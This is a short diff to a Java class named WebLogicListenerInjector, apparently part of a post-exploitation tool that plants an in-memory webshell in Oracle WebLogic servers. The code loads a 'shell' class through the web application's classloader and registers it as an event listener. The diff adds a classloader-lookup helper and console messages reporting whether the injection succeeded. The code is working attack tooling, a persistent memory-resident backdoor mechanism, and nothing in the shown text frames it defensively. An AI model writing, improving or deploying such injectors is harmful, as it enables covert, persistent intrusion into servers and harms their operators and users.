@@ -128,9 +128,17 @@ public class WebLogicListenerInjector {
         return webappContexts.toArray();
     }
 
+    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            return ((ClassLoader) getFieldValue(context, "classLoader"));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = context.getClass().getClassLoader();
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -144,10 +152,12 @@ public class WebLogicListenerInjector {
 
     public void inject(Object context, Object listener) throws Exception {
         if (isInjected(context)) {
+            System.out.println("listener already injected");
             return;
         }
         Object eventsManager = getFieldValue(context, "eventsManager");
         invokeMethod(eventsManager, "registerEventListener", new Class[]{String.class}, new Object[]{getClassName()});
+        System.out.println("listener inject successful");
     }
 
     @SuppressWarnings("unchecked")
